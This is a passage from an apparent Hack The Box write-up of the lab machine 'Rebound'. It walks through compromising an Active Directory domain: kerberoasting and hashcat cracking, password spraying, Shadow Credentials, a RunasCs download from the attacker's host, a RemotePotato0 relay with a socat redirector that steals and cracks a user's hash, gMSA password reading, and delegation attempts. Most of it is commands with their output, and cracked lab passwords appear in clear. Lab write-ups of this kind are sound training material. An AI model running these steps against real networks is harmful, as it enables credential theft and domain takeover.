[-] Principal: batch_runner - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: tbrady - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
$krb5tgs$18$delegator$$REBOUND.HTB$*delegator$*$e69bf7b9d7bdca9e806738a9$30d74768881ac3f1b4a1561d71f450d481a73bf0eed723e3d9f292204e234d79dab33830485b7e7ce3263eeafa973818230fb89925b6757d06357b7bcd5e65be7ca57ec6b8a7602f6519930e16ca5f4eb5c5564e6b5eaabe3c2d137642e672e47a6e2c5ea50836d44cdd16f3210834e1edd7328247f67ed5e83a45a5eede465c06d4114c8e42cacd1417498625f181fb25998ddcb70b649383815fdf9f97b970eae7de4a5e1b03eb368441e1462cc8772b2430d0cbd4d625a8c3dd004751e88cb81db80371f61f5fb1c162b26107e56b09690598338daab94ea509c52c6d4556f5f0dd8ad826bdf263e2dbc5bd536f32b995b977ab9c96d1b680b557577226df9bdc0f463fb82b4620a94c0ed93fa6c112ecc44c5f3891725a59c065bd85d02f76f807799cb6a874386437876c0d97807672f33c089e71c0d2452fbd2c2fc9327fe0c2c557369d7276a94cbf56ad5064a5d87dff4d533b9e46357c719bd85d20c9d72ec3a6bdcf3c9007eb5a2d7f89a714eb20c629d571a1560ad5721d54bf7e5f7e1eddc1619b03c5f372c60a8336b1a989e555bd9f00bfa3f54c9a82a4b99767b531b69861cd868fbdd7e6ea38c1e3dba05e3e71f3080fb346ecdb088316e725caacd646e49de338653ef1e499059b1ebb7db05f73ffce2609dba9385a156f6457783ea101bc83f5f8620ae8afb43b6d28d53d7843d6f845cad142e3b1fb0592f3eb79db7a82d09fc65ecd0ab19d8d57e128bad22b4d98cb4a99b2006846af5f0bd1b54afc5698b9d78631dd83ccb1496b950bd1295a48ae490c340408d5ddacd58d6fca56718fc2998c29344a204afb287b2dff93b49e72990c3e8e48bd6de0c8cc5eba56c8e79551ef2b72b9ca53f7cb13744aa21ef3c9e45ee242f64395e928dd9552b4aac0df34e71bbb019e600354d91c238774e180acad2f6bf23ebb88f39022be067e7173f82ad548cee931dbd5568d6c9670a2f3c20f02bb24c328d34b9ed0395892d1ff60b1108b485ed84ecfbbf55519535a05d7cb84afeef33b6ebdf76dde1548356e7dcd5829c2a9a4595e4b819bae7592eaa00ca91e94d4a45abcf9cfb326e6ff0e5020579aed132cd2eedd408def36a8e0ea44c3887153229091a0dd28a7f8916ed25efcaa54f1de55c13a8af296918fc01ff95c815985d46e177b3b199069e077a28de0ef7c1893cd636cce2167e34f40012a37ebec4d24f06b88ee7db8ef00502ef50d7645353279599b8df8c083707e9c69d3f6b989d849926703396a71235b2fa6bb90796ba43c19e0d632c0851a0c6dfd8c85c6ee0e1d4a3dba45da3198588a9fefaa5e94d56e2d513d408bca35ed300e40a5807097256d9a7d1b7b4c52324584a47ea0eea1941607b235b4bd94fb49f004f042e59a20a45f6865ba69f91e6160c0d4d743a7b8455312ed8cd10a5f
```


**Technical Note on SPNs**:

- SPNs uniquely identify service instances: `serviceclass/machinename:port`
- Examples: `krbtgt/REBOUND.HTB`, `http/dc01.rebound.htb`
- Machine accounts (`DC01$`, `krbtgt$`) have SPNs by default
- User accounts with SPNs can also be kerberoasted

The `ldap_monitor` hash cracked successfully: 

```
hashcat files/hashes/ST.hash /usr/share/wordlists/rockyou.txt      
hashcat (v7.1.2) starting in autodetect mode
< ......SNIP ......>
$krb5tgs$23$*ldap_monitor$REBOUND.HTB$ldap_monitor*$66bf9a129edd6489f69635dc505d98d3$28e3fc2bb2a3cf073a12a517fad8acd3dcd0e342d228b40f2402c4d144b48a27c95a18cd8118a90cca96c5a4de2f8c2930b43f9359944ee8d6e679de2331e970194c9e0b7e78cd1b816c3faa90ff9e1b024182b283323da1909cc49ed50ea388d46a3e7b521635b3f9f568477797a36162b146e50125ef585b3ac19c87d9ea1f7502ab272be8d8fa0d77a8cdc806e4fdf06bce4a8fa954ee4253c84ce2a5e7475e9a7ad21e6861f0f190accb6d674107e1cddb205b968a3e432c5f0728b8c0e78f6639e2e06bcd0073fb31db2a9bb8672296e70d20ecd46e453711a4fe3e36f80a8bda2eb8db1fa7cae0adef8c104521a33a8e7deb15ac37fd70e03a25bc01d1d74bbbe3dd32b3281dee95507186345a07243cbe230303909c2f646c24df80605e6c81d8773cbd21c5a07fa4b8a6e11272661fcb394dc1ad45d904a5b73244a030be27062c11e07967ab807e6f02d93b44ce4772bd6b692b87ca9ee461184976e38c774d23031ecfd29923032d2cfdfe770f2c076cf3006f20cf8bc54c0a56a846eb9f21b636280c2db577afdb57c003e214d98d5b3b0a126e113cd93ac41ec7216b69b4b2a5aa8301b1f1268d6e493b64c6892203b2f522c3b60a3e4230b9b83d6afcb8a0b83aa786bff34705fc3cb4052778b681c4d769b897320c61eb8c637f119bce5662458f9873ee0d561c01b5e9ca7ce74c92b8e928ac36c389e7609c518a3888844fb862808f25175f5ea725f36cb843d7ac1300aeecbeb5e3cd46bb17313af6af1281afda917a4e819ffb4ba883a153c3f7c3e9c2dd86896a7e34461925430f9a6b62ef060e1ab5014d8de20b900faef09a22f2ec2f338a10384234c88eb10981c6f45b1485529ac208fa0fdcabea2ff352c6ecfbb983d7e2566b4ec630964c2981023e2bda2ced9421a3d0796773913c7c64fcfd39ceaa22c0e8771a7e1fbe788d6a8752590d45511f30f05c95b9a86c13b1f76b359bd1256c051de30c8fb1ad9bfe08976a216e0f8a1304f15147aae3e6d64b65140b2a3ac213da8c7890625cfeb3cd4bbebbbe8756099bf3a51771303de2ac04c75f24e13c24c5e3f3c7a533e5df5732360ed45f59e4c5551e621b54b72aa4d02376682192cc5e0bcc824a6575d2ec0dbd2d95b4397ae3b61e0d4ad286dce93fb696a33d69423d242abcd7044e24d4cb452679f5daaf30ec30ea77bee80a9fbc4384a9ca1994dddf8dfa866f8102879c718094e12018e1794720fcce84406757133762876813b9b3702809194f566e653d7df6d9ba248e850fa8a00d8d6a9378eacc68a34db38d2bbd69b1ce0fb74e71812fc5394488ff9496a963bba09c583b62ef5d14fa66e86cd765827e72dec7287f67c87a7c2464c3095a44d35c417f5f154fefc8e313bd59584197d35c03dca534fd935255243fc13c824c8d3f2cc598:1GR8t@$$4u
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*ldap_monitor$REBOUND.HTB$ldap_monitor*...2cc598
Time.Started.....: Wed Feb 25 18:42:22 2026 (10 secs)
Time.Estimated...: Wed Feb 25 18:42:32 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  1304.3 kH/s (2.48ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 13041664/14344385 (90.92%)
Rejected.........: 0/13041664 (0.00%)
Restore.Point....: 13037568/14344385 (90.89%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: 1Montanasky -> 1COLORADO
Hardware.Mon.#01.: Temp: 57c Util: 75%

Started: Wed Feb 25 18:42:20 2026
Stopped: Wed Feb 25 18:42:34 2026
```

### Password Spraying

**Technical Concept**: Password spraying tests a single password against many usernames, avoiding account lockouts.

```
nxc smb rebound.htb -u files/users.txt -p '1GR8t@$$4u' --continue-on-success
SMB         10.129.232.31   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.31   445    DC01             [+] rebound.htb\guest::1GR8t@$$4u (Guest)
SMB         10.129.232.31   445    DC01             [+] rebound.htb\Enterprise:1GR8t@$$4u (Guest)
SMB         10.129.232.31   445    DC01             [-] rebound.htb\Administrator:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.232.31   445    DC01             [-] rebound.htb\Guest:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.232.31   445    DC01             [-] rebound.htb\krbtgt:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.232.31   445    DC01             [+] rebound.htb\Domain:1GR8t@$$4u (Guest)
SMB         10.129.232.31   445    DC01             [+] rebound.htb\Domain:1GR8t@$$4u (Guest)
SMB         10.129.232.31   445    DC01             [+] rebound.htb\Domain:1GR8t@$$4u (Guest)
SMB         10.129.232.31   445    DC01             [+] rebound.htb\Domain:1GR8t@$$4u (Guest)
SMB         10.129.232.31   445    DC01             [+] rebound.htb\Domain:1GR8t@$$4u (Guest)
SMB         10.129.232.31   445    DC01             [+] rebound.htb\Cert:1GR8t@$$4u (Guest)
SMB         10.129.232.31   445    DC01             [+] rebound.htb\Schema:1GR8t@$$4u (Guest)
SMB         10.129.232.31   445    DC01             [+] rebound.htb\Enterprise:1GR8t@$$4u (Guest)
SMB         10.129.232.31   445    DC01             [+] rebound.htb\Group:1GR8t@$$4u (Guest)
SMB         10.129.232.31   445    DC01             [+] rebound.htb\Read-only:1GR8t@$$4u (Guest)
SMB         10.129.232.31   445    DC01             [+] rebound.htb\Cloneable:1GR8t@$$4u (Guest)
SMB         10.129.232.31   445    DC01             [+] rebound.htb\Protected:1GR8t@$$4u (Guest)
SMB         10.129.232.31   445    DC01             [+] rebound.htb\Key:1GR8t@$$4u (Guest)
SMB         10.129.232.31   445    DC01             [+] rebound.htb\Enterprise:1GR8t@$$4u (Guest)
SMB         10.129.232.31   445    DC01             [+] rebound.htb\RAS:1GR8t@$$4u (Guest)
SMB         10.129.232.31   445    DC01             [+] rebound.htb\Allowed:1GR8t@$$4u (Guest)
SMB         10.129.232.31   445    DC01             [+] rebound.htb\Denied:1GR8t@$$4u (Guest)
SMB         10.129.232.31   445    DC01             [-] rebound.htb\DC01$:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.232.31   445    DC01             [+] rebound.htb\DnsAdmins:1GR8t@$$4u (Guest)
SMB         10.129.232.31   445    DC01             [+] rebound.htb\DnsUpdateProxy:1GR8t@$$4u (Guest)
SMB         10.129.232.31   445    DC01             [-] rebound.htb\ppaul:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.232.31   445    DC01             [-] rebound.htb\llune:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.232.31   445    DC01             [-] rebound.htb\fflock:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.232.31   445    DC01             [-] rebound.htb\jjones:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.232.31   445    DC01             [-] rebound.htb\mmalone:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.232.31   445    DC01             [-] rebound.htb\nnoon:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.232.31   445    DC01             [+] rebound.htb\ldap_monitor:1GR8t@$$4u 
SMB         10.129.232.31   445    DC01             [+] rebound.htb\oorend:1GR8t@$$4u 
SMB         10.129.232.31   445    DC01             [+] rebound.htb\ServiceMgmt:1GR8t@$$4u (Guest)
SMB         10.129.232.31   445    DC01             [-] rebound.htb\winrm_svc:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.232.31   445    DC01             [-] rebound.htb\batch_runner:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.232.31   445    DC01             [-] rebound.htb\tbrady:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.232.31   445    DC01             [-] rebound.htb\delegator$:1GR8t@$$4u STATUS_LOGON_FAILURE
```


**Result**: `oorend` also uses the same password.

## BloodHound Analysis

### Technical Concept: BloodHound

BloodHound maps Active Directory relationships to find attack paths. It uses graph theory to identify:

- **Shortest paths to Domain Admin**
- **ACL abuses** (GenericAll, WriteOwner, etc.)
- **Delegation relationships**
- **Group memberships**

Collecting data:

```
bloodhound-python -d rebound.htb -u ldap_monitor -p '1GR8t@$$4u' -c All --zip -ns 10.129.232.31 --use-ldaps
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: rebound.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.rebound.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to GC LDAP server: dc01.rebound.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Connecting to LDAP server: dc01.rebound.htb
INFO: Found 16 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc01.rebound.htb
INFO: Done in 01M 14S
INFO: Compressing output into 20260225185520_bloodhound.zip
```


![img](Pasted image 20260225193552.png)


**Attack Path Revealed**:
1. `oorend` → Can add self to `ServiceMgmt` group
2. `ServiceMgmt` → Has GenericAll on `SERVICE USERS` OU
3. This OU contains `winrm_svc` → Can perform Shadow Credentials attack
4. `winrm_svc` → Member of `Remote Management Users` → WinRM access

## Shadow Credentials Attack

### Technical Concept: Shadow Credentials

**What are Shadow Credentials?**

- Active Directory allows associating certificates with user accounts (Key Credentials)
- These certificates can authenticate via PKINIT (Kerberos with certificates)
- Attackers can add their own certificate to any account they have write access to

**Requirements**:

- `GenericAll`, `GenericWrite`, or `WriteProperty` on target
- Ability to modify `msDS-KeyCredentialLink` attribute

**Why it works**: The Key Credential Link can have multiple values. Adding a rogue certificate doesn't remove existing ones.

### Executing Shadow Credentials

First, add `oorend` to `ServiceMgmt` group:

```
bloodyAD -d rebound.htb -u oorend -p '1GR8t@$$4u' --dc-ip 10.129.232.31 add groupMember ServiceMgmt oorend
[+] oorend added to ServiceMgmt
```

Grant GenericAll on the OU:

```
bloodyAD -d rebound.htb -u oorend -p '1GR8t@$$4u' --dc-ip 10.129.232.31 add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' oorend
[+] oorend has now GenericAll on OU=SERVICE USERS,DC=REBOUND,DC=HTB
```

**Technical Note**: GenericAll on an OU grants permissions on all objects within it.

Perform Shadow Credentials attack on `winrm_svc`:

```
bloodyAD -d rebound.htb -u oorend -p '1GR8t@$$4u' --dc-ip 10.129.232.31 add shadowCredentials winrm_svc
[+] KeyCredential generated with following sha256 of RSA key: f26fab36c2eaa7b933f0dcadd5c6631aed4146ece4f0efc64659c03ff43a825d
No outfile path was provided. The certificate(s) will be stored with the filename: xHjfOmi2
[+] Saved PEM certificate at path: xHjfOmi2_cert.pem
[+] Saved PEM private key at path: xHjfOmi2_priv.pem
A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
Run the following command to obtain a TGT:
python3 PKINITtools/gettgtpkinit.py -cert-pem xHjfOmi2_cert.pem -key-pem xHjfOmi2_priv.pem rebound.htb/winrm_svc xHjfOmi2.ccache
```

This creates certificate files: `xHjfOmi2_cert.pem` and `xHjfOmi2_priv.pem`
### Obtaining TGT via PKINIT

**Technical Concept: PKINIT**

- Kerberos extension allowing certificate-based authentication
- User presents certificate, KDC validates and issues TGT
- Bypasses password authentication entirely

```
python3 PKINITtools/gettgtpkinit.py -cert-pem xHjfOmi2_cert.pem -key-pem xHjfOmi2_priv.pem rebound.htb/winrm_svc xHjfOmi2.ccache
2026-02-25 19:45:59,265 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2026-02-25 19:45:59,278 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2026-02-25 19:46:08,305 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2026-02-25 19:46:08,306 minikerberos INFO     689c4ebeed2f3c68cf2cebee30292a7fdbd232f882d8bbe549691b4bdd97d1a8
INFO:minikerberos:689c4ebeed2f3c68cf2cebee30292a7fdbd232f882d8bbe549691b4bdd97d1a8
2026-02-25 19:46:08,317 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

Export the ticket:

```
export KRB5CCNAME=xHjfOmi2.ccache 
klist 
Ticket cache: FILE:xHjfOmi2.ccache
Default principal: winrm_svc@REBOUND.HTB

Valid starting       Expires              Service principal
02/25/2026 19:46:08  02/26/2026 05:46:08  krbtgt/REBOUND.HTB@REBOUND.HTB
```

### WinRM Access

Generate Kerberos configuration:

```
nxc smb rebound.htb --use-kcache --generate-krb5-file krb5.conf
SMB         rebound.htb     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         rebound.htb     445    DC01             [+] krb5 conf saved to: krb5.conf
SMB         rebound.htb     445    DC01             [+] Run the following command to use the conf file: export KRB5_CONFIG=krb5.conf
SMB         rebound.htb     445    DC01             [+] REBOUND.HTB\winrm_svc from ccache 

export KRB5_CONFIG=krb5.conf

```

Connect via Evil-WinRM:

```

evil-winrm -i dc01.rebound.htb -r REBOUND.HTB -K xHjfOmi2.ccache 
                                        
Evil-WinRM shell v3.9
                                        
Warning: KRB5CCNAME is already set to: xHjfOmi2.ccache. Using existing value instead of /home/d4rkc0de/LABS/HTB/HTB-Retired-Insane/Rebound/files/xHjfOmi2.ccache
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> 
```

**User flag**: `C:\Users\winrm_svc\Desktop``

## Privilege Escalation

### Tasklist Access Issue
```
*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> tasklist
tasklist.exe : ERROR: Access denied
    + CategoryInfo          : NotSpecified: (ERROR: Access denied:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> 
```


**Technical Explanation**: WinRM sessions run with a restricted token. Even though `winrm_svc` has permissions to run tasklist, the WinRM service itself may have restrictions. Using `RunasCs` with a different logon type bypasses these restrictions.
```
*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> cd /programdata
*Evil-WinRM* PS C:\programdata> wget http://10.10.15.81:8000/RunasCs.exe -O RunasCs.exe
*Evil-WinRM* PS C:\programdata> .\RunasCs.exe x x tasklist -l 9


Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System Idle Process              0 Services                   0          8 K
System                           4 Services                   0        152 K
Registry                        88 Services                   0     10,664 K
<...SNIP...>
```

**Logon Type 9**: `LOGON32_LOGON_NEW_CREDENTIALS` - Similar to `runas /netonly`, creates a new token with the same user but different logon session, bypassing WinRM restrictions.

### Discovering Another Session

```
*Evil-WinRM* PS C:\programdata> .\RunasCs.exe x x qwinsta -l 9  

 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
>services                                    0  Disc
 console           tbrady                    1  Active
*Evil-WinRM* PS C:\programdata> 
```

**Technical Concept**: Windows supports multiple interactive sessions simultaneously. Session 1 has `tbrady` logged in via console.

## Cross-Session Relay Attack

### Technical Concept: RemotePotato0

**What is RemotePotato0?**

- Exploits DCOM (Distributed Component Object Model) to trigger NTLM authentication
- Forces a user in another session to authenticate to an attacker-controlled server
- Captures NetNTLMv2 hash for cracking or relay

**Why it works**:

1. DCOM allows instantiating objects in other sessions
2. When instantiated, the object can trigger authentication back to the caller
3. By setting up an Oxid Resolver (part of DCOM), we can redirect this authentication

### Localhost Limitation

```
*Evil-WinRM* PS C:\programdata> .\RemotePotato0.exe -m 2 -s 1
[!] Detected a Windows Server version not compatible with JuicyPotato, you cannot run the RogueOxidResolver on 127.0.0.1. RogueOxidResolver must be run remotely.
[!] Example Network redirector:
        sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:{{ThisMachineIp}}:9999
*Evil-WinRM* PS C:\programdata> 

```
**Technical Explanation**:

- Windows Server 2019+ has protections against local RPC loopback attacks
- The Oxid Resolver (part of DCOM) won't accept connections from 127.0.0.1    
- We must forward port 135 from our attack machine to the victim's port 9999

### Port Forwarding with Socat

On attack machine:

```
sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.129.232.31:9999
```

**Technical Explanation**:

- `socat` creates a bidirectional data relay
- Listens on port 135 (standard RPC port)
- Forwards all traffic to victim's port 9999
- Victim's RemotePotato0 listens on 9999 for the relayed RPC traffic

### Executing the Relay

On victim:

```
*Evil-WinRM* PS C:\programdata> .\RemotePotato0.exe -m 2 -s 1 -x 10.10.15.81
[*] Detected a Windows Server version not compatible with JuicyPotato. RogueOxidResolver must be run remotely. Remember to forward tcp port 135 on (null) to your victim machine on port 9999
[*] Example Network redirector:
        sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:{{ThisMachineIp}}:9999
[*] Starting the RPC server to capture the credentials hash from the user authentication!!
[*] Spawning COM object in the session: 1
[*] Calling StandardGetInstanceFromIStorage with CLSID:{5167B42F-C111-47A1-ACC4-8EABE61B0B54}
[*] RPC relay server listening on port 9997 ...
[*] Starting RogueOxidResolver RPC Server listening on port 9999 ...
[*] IStoragetrigger written: 104 bytes
[*] ServerAlive2 RPC Call
[*] ResolveOxid2 RPC call
[+] Received the relayed authentication on the RPC relay server on port 9997
[*] Connected to RPC Server 127.0.0.1 on port 9999
[+] User hash stolen!

NTLMv2 Client   : DC01
NTLMv2 Username : rebound\tbrady
NTLMv2 Hash     : tbrady::rebound:a85f3daa4f0c1f24:f3157d87da62b2dc758f35eda718ba21:0101000000000000187434d47ba6dc01bee4967ce0a4afb50000000002000e007200650062006f0075006e006400010008004400430030003100040016007200650062006f0075006e0064002e006800740062000300200064006300300031002e007200650062006f0075006e0064002e00680074006200050016007200650062006f0075006e0064002e0068007400620007000800187434d47ba6dc010600040006000000080030003000000000000000010000000020000024b9a385b4ed406b6dc287c24865b9022135a57fc3664418fdeb3d9b841dd3c50a00100000000000000000000000000000000000090000000000000000000000

*Evil-WinRM* PS C:\programdata>
```

**Parameters**:

- `-m 2`: Mode 2 (RogueOxidResolver + DCOM trigger)
- `-s 1`: Target session ID 1 (tbrady's session)
- `-x 10.10.15.81`: Our attack machine IP for callback

**Result - Captured Hash**:

### Technical Concept: NetNTLMv2

NetNTLMv2 is a challenge-response authentication protocol:

- Client proves knowledge of password without sending it
- Hash format: `username::domain:challenge:HMAC-MD5:blob`
- Can be cracked offline or used in relay attacks

Cracking the hash:

```
hashcat files/hashes/tbrady.hash /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting in autodetect mode
<....SNIP....>
TBRADY::rebound:a85f3daa4f0c1f24:f3157d87da62b2dc758f35eda718ba21:0101000000000000187434d47ba6dc01bee4967ce0a4afb50000000002000e007200650062006f0075006e006400010008004400430030003100040016007200650062006f0075006e0064002e006800740062000300200064006300300031002e007200650062006f0075006e0064002e00680074006200050016007200650062006f0075006e0064002e0068007400620007000800187434d47ba6dc010600040006000000080030003000000000000000010000000020000024b9a385b4ed406b6dc287c24865b9022135a57fc3664418fdeb3d9b841dd3c50a00100000000000000000000000000000000000090000000000000000000000:543BOMBOMBUNmanda
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: TBRADY::rebound:a85f3daa4f0c1f24:f3157d87da62b2dc75...000000
Time.Started.....: Wed Feb 25 20:27:23 2026 (10 secs)
Time.Estimated...: Wed Feb 25 20:27:33 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  1215.8 kH/s (2.41ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 12193792/14344385 (85.01%)
Rejected.........: 0/12193792 (0.00%)
Restore.Point....: 12189696/14344385 (84.98%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: 5440166 -> 54186761989
Hardware.Mon.#01.: Temp: 62c Util: 74%

Started: Wed Feb 25 20:27:21 2026
Stopped: Wed Feb 25 20:27:35 2026
```

**Result**: `543BOMBOMBUNmanda`

## Group Managed Service Account (gMSA) Exploitation

Tbrady can read the GMSA password 

![img](Pasted image 20260225203037.png)

### Technical Concept: gMSA

**What is a gMSA?**

- Group Managed Service Account
- Computer-managed service account with automatic password rotation
- Passwords are complex, 120-character random values
- **Critical Feature**: Passwords can be retrieved by authorized principals

**Password Retrieval**:

- Domain controllers compute gMSA passwords using **KDS Root Key**
- Authorized users/computer can retrieve current password via LDAP
- The `msDS-ManagedPassword` attribute contains the current password

### Reading gMSA Password

Using netexec I got the hash

```
nxc ldap rebound.htb -u tbrady -p 543BOMBOMBUNmanda --gmsa      
LDAP        10.129.232.31   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:rebound.htb) (signing:Enforced) (channel binding:Always) 
LDAP        10.129.232.31   389    DC01             [+] rebound.htb\tbrady:543BOMBOMBUNmanda 
LDAP        10.129.232.31   389    DC01             [*] Getting GMSA Passwords
LDAP        10.129.232.31   389    DC01             Account: delegator$           NTLM: a31c61fe5ddd5b57f6935f5bd529a0fb     PrincipalsAllowedToReadPassword: tbrady
```

**Technical Explanation**:

- `delegator$` is a gMSA (indicated by `$` and type)
- `tbrady` is in the list of principals allowed to read its password
- We now have the NTLM hash for the gMSA account

## Resource-Based Constrained Delegation (RBCD)

### Technical Concept: Delegation Types

**Unconstrained Delegation** (DC01$):

- Service can impersonate users to ANY service
- Most dangerous - TGT is forwarded
- Detected by `TrustedForDelegation = True`

**Constrained Delegation** (delegator$):

- Service can impersonate users to SPECIFIC services only
- "w/o Protocol Transition" means Kerberos authentication only   
- Detected by `msDS-AllowedToDelegateTo` attribute

**Resource-Based Constrained Delegation**:
- Resource (target service) specifies who can delegate to it
- Controlled by `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute
- More secure - delegation controlled by resource owner

### Verifying Delegation

```
impacket-findDelegation 'rebound.htb/ldap_monitor:1GR8t@$$4u' 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

AccountName  AccountType                          DelegationType                       DelegationRightsTo     SPN Exists 
-----------  -----------------------------------  -----------------------------------  ---------------------  ----------
DC01$        Computer                             Unconstrained                        N/A                    Yes        
delegator$   ms-DS-Group-Managed-Service-Account  Constrained w/o Protocol Transition  http/dc01.rebound.htb  No         
```

### Initial Delegation Attempt

Attempting to impersonate DC01$ with constrained delegation:

```
impacket-getST 'rebound.htb/delegator$' -spn 'http/dc01.rebound.htb' -impersonate 'DC01$' -hashes :a31c61fe5ddd5b57f6935f5bd529a0fb      
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating DC01$
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[-] Kerberos SessionError: KDC_ERR_BADOPTION(KDC cannot accommodate requested option)
[-] Probably SPN is not allowed to delegate by user delegator$ or initial TGT not forwardable
```

**Technical Explanation**: The error occurs because:

1. `delegator$` has constrained delegation to `http/dc01.rebound.htb`
2. To impersonate another user, we need a **forwardable** TGT
3. The initial TGT from a gMSA may not be forwardable

Using `-self` works but produces non-forwardable ticket

```
impacket-getST 'rebound.htb/delegator$' -spn 'http/dc01.rebound.htb' -impersonate 'DC01$' -hashes :a31c61fe5ddd5b57f6935f5bd529a0fb -self
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating DC01$
[*] When doing S4U2self only, argument -spn is ignored
[*] Requesting S4U2self
[*] Saving ticket in DC01$@delegator$@REBOUND.HTB.ccache


impacket-describeTicket DC01\$@delegator\$@REBOUND.HTB.ccache                                                                            
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Number of credentials in cache: 1
[*] Parsing credential[0]:
[*] Ticket Session Key            : ae9868cedfe5ece10476f04387266795
[*] User Name                     : DC01$
[*] User Realm                    : rebound.htb
[*] Service Name                  : delegator$
[*] Service Realm                 : REBOUND.HTB
[*] Start Time                    : 26/02/2026 01:13:17 AM
[*] End Time                      : 26/02/2026 11:13:16 AM
[*] RenewTill                     : 27/02/2026 01:13:15 AM
[*] Flags                         : (0xa10000) renewable, pre_authent, enc_pa_rep
[*] KeyType                       : rc4_hmac
[*] Base64(key)                   : rphozt/l7OEEdvBDhyZnlQ==
